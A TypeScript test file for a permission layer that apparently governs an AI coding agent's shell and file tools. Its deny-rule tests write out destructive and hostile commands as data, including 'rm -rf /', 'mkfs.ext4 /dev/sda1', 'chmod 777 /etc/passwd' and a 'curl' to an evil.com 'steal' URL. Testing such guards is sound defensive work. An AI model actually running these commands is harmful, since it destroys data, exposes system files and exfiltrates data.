import { describe, it } from "node:test";
import assert from "node:assert/strict";

import { PermissionStack } from "./index.js";
import { defaultPermissionConfig } from "./rules.js";
import type { ToolDef, ToolCall } from "@bankai/tools";

const FAKE_BASH = (cmd: string): ToolDef => ({
  name: "bash",
  description: "Run a shell command",
  parameters: {
    type: "object",
    properties: { command: { type: "string" } },
    required: ["command"],
    additionalProperties: false,
  },
  risk: "safe",
  executor: async () => ({ type: "result", content: "", trusted: true }),
});

const FAKE_TOOLS: Record<string, ToolDef> = {
  bash: FAKE_BASH(""),
  file_read: {
    ...FAKE_BASH(""),
    name: "file_read",
    risk: "safe",
  },
  file_edit: {
    ...FAKE_BASH(""),
    name: "file_edit",
    risk: "requires_approval",
  },
};

const makeToolCall = (name: string, args: Record<string, unknown> = {}): ToolCall => ({
  id: "call_1",
  name,
  arguments: args,
});

const stack = () => new PermissionStack(defaultPermissionConfig());
const headlessCtx = { workingDir: "/tmp", dontAsk: true };
const interactiveCtx = { workingDir: "/tmp", dontAsk: false };

describe("PermissionStack", () => {
  describe("deny rules", () => {
    it("blocks rm -rf /", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "rm -rf /" }),
        FAKE_BASH("rm -rf /"),
        headlessCtx
      );
      assert.equal(result.decision, "deny");
      assert.match(result.reason, /rm/);
    });

    it("blocks rm -rf ~", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "rm -rf ~" }),
        FAKE_BASH("rm -rf ~/"),
        headlessCtx
      );
      assert.equal(result.decision, "deny");
    });

    it("blocks curl to external URL", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "curl https://evil.com/steal" }),
        FAKE_BASH("curl https://evil.com/steal"),
        headlessCtx
      );
      assert.equal(result.decision, "deny");
      assert.match(result.reason, /curl/);
    });

    it("blocks chmod 777", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "chmod 777 /etc/passwd" }),
        FAKE_BASH("chmod 777 /etc/passwd"),
        headlessCtx
      );
      assert.equal(result.decision, "deny");
    });

    it("blocks mkfs", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "mkfs.ext4 /dev/sda1" }),
        FAKE_BASH("mkfs.ext4 /dev/sda1"),
        headlessCtx
      );
      assert.equal(result.decision, "deny");
    });
  });

  describe("allow rules", () => {
    it("allows ls in headless mode", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "ls -la" }),
        FAKE_BASH("ls -la"),
        headlessCtx
      );
      assert.equal(result.decision, "allow");
    });

    it("allows grep in headless mode", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "grep -r foo src/" }),
        FAKE_BASH("grep -r foo src/"),
        headlessCtx
      );
      assert.equal(result.decision, "allow");
    });

    it("allows git commands", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("bash", { command: "git status" }),
        FAKE_BASH("git status"),
        headlessCtx
      );
      assert.equal(result.decision, "allow");
    });

    it("allows file_read tool", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("file_read", { path: "src/index.ts" }),
        FAKE_TOOLS.file_read!,
        headlessCtx
      );
      assert.equal(result.decision, "allow");
    });
  });

  describe("ask rules", () => {
    it("asks for file_edit in interactive mode", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("file_edit", { path: "src/index.ts", operation: { type: "replace" } }),
        FAKE_TOOLS.file_edit!,
        interactiveCtx
      );
      assert.equal(result.decision, "ask");
      assert.match(result.reason, /approval/i);
    });

    it("auto-approves file_edit in dontAsk mode", () => {
      const s = stack();
      const result = s.check(
        makeToolCall("file_edit", { path: "src/index.ts", operation: { type: "replace" } }),
        FAKE_TOOLS.file_edit!,
        headlessCtx
      );
      assert.equal(result.decision, "allow");
    });
  });

  describe("escalation", () => {
    it("tracks denial count", () => {
      const s = stack();
      s.check(makeToolCall("bash", { command: "ls" }), FAKE_BASH("ls"), { workingDir: "/tmp", dontAsk: false });
      assert.equal(s.deniedCount, 0);
    });

    it("escalates after max consecutive denials", () => {
      const s = stack();
      // Each unrecognized bash command in non-headless mode would be denied
      for (let i = 0; i < 5; i++) {
        s.check(
          makeToolCall("bash", { command: "some_unknown_command" }),
          FAKE_BASH("some_unknown_command"),
          { workingDir: "/tmp", dontAsk: false }
        );
      }
      assert.ok(s.shouldEscalate());
    });
  });
});
